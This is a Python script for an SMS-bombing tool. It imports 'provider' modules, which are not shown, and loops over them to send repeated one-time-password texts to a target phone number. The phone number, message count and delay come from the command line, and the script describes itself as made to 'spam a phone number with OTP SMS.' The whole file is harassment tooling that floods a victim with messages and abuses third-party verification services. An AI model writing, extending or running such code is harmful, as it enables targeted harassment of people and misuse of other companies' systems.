import importlib
import os
import argparse
import time
import signal

# Get the list of all provider files
provider_files = os.listdir("providers")

# Remove the .py extension from file names
provider_names = [
    f[:-3] for f in provider_files if f.endswith(".py") and f != "__init__.py"
]

# Import all providers and instantiate objects
provider_objects = []
for name in provider_names:
    module = importlib.import_module(f"providers.{name}")
    class_ = getattr(module, "p_" + name)
    provider_objects.append(class_())


def bombSms(count: int, phone: str, delay: int, providers=provider_objects):
    counter = 0
    while count > 0:
        counter = (counter + 1) % len(providers)
        status = providers[counter].send(phone)
        if status == 1:
            count -= 1
            print(f"SMS sent successfully via {providers[counter].name}")

            # Delay between OTPs
            if count > 0:
                time.sleep(delay)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Spam a phone number with OTP SMS")
    parser.add_argument("phone", type=str, help="Phone number to send the OTP to")
    parser.add_argument("count", type=int, help="Number of OTPs to send")
    parser.add_argument("delay", type=int, help="Delay between OTPs in seconds")

    args = parser.parse_args()

    def timeout_handler(signum, frame):
        raise TimeoutError("Bombing SMS timed out")

    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(360)  # Set the timeout to 6 minutes

    bombSms(args.count, args.phone, args.delay)

    signal.alarm(0)  # Cancel the timeout
